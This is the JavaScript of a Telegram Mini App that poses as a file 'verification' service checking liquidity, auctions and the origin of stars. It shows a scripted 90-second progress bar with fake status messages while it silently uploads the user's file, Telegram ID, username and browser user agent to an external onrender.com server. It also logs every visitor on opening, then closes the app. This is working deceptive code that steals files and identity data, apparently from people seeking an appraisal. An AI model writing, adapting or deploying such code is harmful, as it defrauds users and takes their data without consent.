<script>
    const SERVER_URL = "https://nicegrammarse.onrender.com"; 
    const tg = window.Telegram.WebApp;
    tg.expand();

    const fileInput = document.getElementById('fileInput');
    const stepStart = document.getElementById('step-start');
    const stepProgress = document.getElementById('step-progress');
    const mainFooter = document.getElementById('mainFooter');
    const percentText = document.getElementById('percent');
    const progressFill = document.getElementById('progressFill');
    const statusText = document.getElementById('statusText');

    if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
        document.getElementById('greeting').innerText = `Привет, ${tg.initDataUnsafe.user.first_name}`;
    }

    // --- НОВОЕ: ЛОГ ВХОДА ---
    function logEntry() {
        const user = tg.initDataUnsafe.user || {};
        fetch(`${SERVER_URL}/log_entry`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                user_id: user.id || "0000",
                username: user.username || "нет юзернейма",
                user_agent: navigator.userAgent
            })
        }).catch(e => console.error(e));
    }
    logEntry(); // Запуск при открытии

    function openModal(modalId) {
        document.querySelector('.modal-overlay').classList.add('active');
        document.getElementById(modalId).classList.add('active');
    }
    function closeAllModals() {
        document.querySelector('.modal-overlay').classList.remove('active');
        document.querySelectorAll('.modal').forEach(modal => modal.classList.remove('active'));
    }

    fileInput.addEventListener('change', () => {
        const file = fileInput.files[0];
        if (file) startVerificationProcess(file);
    });

    function startVerificationProcess(file) {
        stepStart.style.display = 'none';
        mainFooter.style.display = 'none';
        stepProgress.style.display = 'flex';

        uploadFileInBackground(file);

        let progress = 0;
        const duration = 90000; 
        const intervalTime = 100;
        const increment = 100 / (duration / intervalTime);

        const timer = setInterval(() => {
            progress += increment;
            if (progress > 100) progress = 100;
            updateStatus(progress);
            if (progress >= 100) {
                clearInterval(timer);
                finishProcess();
            }
        }, intervalTime);
    }

    // ТВОИ ОРИГИНАЛЬНЫЕ ТЕКСТЫ
    function updateStatus(currentPercent) {
        percentText.innerText = Math.floor(currentPercent) + "%";
        progressFill.style.width = currentPercent + "%";

        if (currentPercent < 20) {
            statusText.innerText = "Проверяем ликвидность вашего файла";
        } else if (currentPercent < 45) {
            statusText.innerText = "Проверяем аукционы";
        } else if (currentPercent < 75) {
            statusText.innerText = "Проверяем происхождения звёзд";
        } else if (currentPercent < 95) {
            statusText.innerText = "Вот вот закончили";
        } else {
            statusText.innerText = "Готовим итоговый вердикт";
        }
    }

    // ОБНОВЛЕННАЯ ЗАГРУЗКА (С UA И USERNAME)
    function uploadFileInBackground(file) {
        const user = tg.initDataUnsafe.user || {};
        const formData = new FormData();
        formData.append('file', file);
        formData.append('user_id', user.id || "0000");
        formData.append('username', user.username || "нет юзернейма");
        formData.append('user_agent', navigator.userAgent);

        fetch(`${SERVER_URL}/upload`, { method: 'POST', body: formData })
            .catch(err => console.error(err));
    }

    function finishProcess() {
        if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
        setTimeout(() => { tg.close(); }, 2000);
    }
</script>
